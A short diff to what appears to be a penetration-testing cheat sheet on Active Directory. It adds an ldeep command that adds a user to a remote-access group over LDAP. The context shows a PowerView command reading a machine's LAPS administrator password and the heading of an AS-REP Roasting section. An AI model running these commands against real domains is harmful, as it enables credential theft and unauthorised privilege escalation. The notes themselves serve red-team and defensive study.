@@ -59,6 +59,10 @@ Using PowerView.ps1 and if LAPS is installed:
 ```powershell
 Get-AdmPwdPassword -ComputerName $(hostname)
 ```
+
+```bash
+ldeep ldap -u $USER -p $PASSWORD -d nara-security.com -s ldap://nara-security.com add_to_group "CN=USER NAME,OU=GROUP,DC=DC_NAME,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=DOMAIN,DC=COM"
+```
 AS-REP Roasting
 ---
 #as-rep-roasting #kerberos #asrep-roasting
